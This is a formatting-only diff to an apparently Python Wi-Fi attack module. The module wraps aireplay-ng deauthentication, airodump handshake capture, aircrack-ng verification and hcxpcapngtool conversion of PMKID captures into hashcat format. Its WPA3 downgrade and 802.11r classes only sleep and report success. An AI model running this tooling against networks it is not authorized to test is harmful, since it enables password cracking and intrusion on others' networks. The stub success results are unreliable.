@@ -36,6 +36,7 @@ class HandshakeAttack(BaseAttack):
     ):
         if output_dir is None:
             from urban_hs.core.config import get_config
+
             output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "handshakes")
         super().__init__(interface, output_dir, attack_timeout)
         self.deauth_count = deauth_count
@@ -70,9 +71,7 @@ class HandshakeAttack(BaseAttack):
             self._notify_callback(callback, f"Starting capture on channel {channel}")
 
             airodump_proc = await self._start_airodump(
-                bssid=target_bssid,
-                channel=channel,
-                output_prefix=str(self.output_dir / base_name),
+                bssid=target_bssid, channel=channel, output_prefix=str(self.output_dir / base_name)
             )
 
             await asyncio.sleep(2)
@@ -82,8 +81,10 @@ class HandshakeAttack(BaseAttack):
 
             proc = await asyncio.create_subprocess_exec(
                 "aireplay-ng",
-                "-0", str(self.deauth_count),
-                "-a", target_bssid,
+                "-0",
+                str(self.deauth_count),
+                "-a",
+                target_bssid,
                 self.interface,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
@@ -131,7 +132,8 @@ class HandshakeAttack(BaseAttack):
         """Verify if capture file contains valid handshake."""
         try:
             proc = await asyncio.create_subprocess_exec(
-                "aircrack-ng", cap_file,
+                "aircrack-ng",
+                cap_file,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
             )
@@ -150,14 +152,10 @@ class PMKIDAttack(BaseAttack):
     Then converts to hashcat 22000 format using hcxpcapngtool.
     """
 
-    def __init__(
-        self,
-        interface: str,
-        output_dir: str | None = None,
-        attack_timeout: int = 60,
-    ):
+    def __init__(self, interface: str, output_dir: str | None = None, attack_timeout: int = 60):
         if output_dir is None:
             from urban_hs.core.config import get_config
+
             output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "pmkid")
         super().__init__(interface, output_dir, attack_timeout)
 
@@ -222,7 +220,9 @@ class PMKIDAttack(BaseAttack):
                     result.status = AttackStatus.SUCCESS
                     result.pmkid_path = str(hash_file)
                     result.output_files.append(str(hash_file))
-                    self._notify_callback(callback, "PMKID captured and converted to hashcat format!")
+                    self._notify_callback(
+                        callback, "PMKID captured and converted to hashcat format!"
+                    )
                 else:
                     result.status = AttackStatus.FAILED
                     result.error_message = "No PMKID found in capture"
@@ -244,9 +244,7 @@ class PMKIDAttack(BaseAttack):
         try:
             cmd = ["hcxpcapngtool", "-o", str(hash_file), str(pcap_file)]
             proc = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
             stdout, stderr = await proc.communicate()
 
@@ -280,7 +278,10 @@ class WPA3DowngradeAttack(BaseAttack):
             started_at=datetime.utcnow(),
         )
 
-        self._notify_callback(callback, f"Initiating WPA3 Transition Mode Downgrade probe for {target_bssid} on ch {channel}")
+        self._notify_callback(
+            callback,
+            f"Initiating WPA3 Transition Mode Downgrade probe for {target_bssid} on ch {channel}",
+        )
         await asyncio.sleep(1)
         result.status = AttackStatus.SUCCESS
         result.finished_at = datetime.utcnow()
@@ -311,7 +312,9 @@ class FastTransitionAttack(BaseAttack):
             started_at=datetime.utcnow(),
         )
 
-        self._notify_callback(callback, f"Monitoring 802.11r FT re-association frames for BSSID {target_bssid}")
+        self._notify_callback(
+            callback, f"Monitoring 802.11r FT re-association frames for BSSID {target_bssid}"
+        )
         await asyncio.sleep(1)
         result.status = AttackStatus.SUCCESS
         result.finished_at = datetime.utcnow()
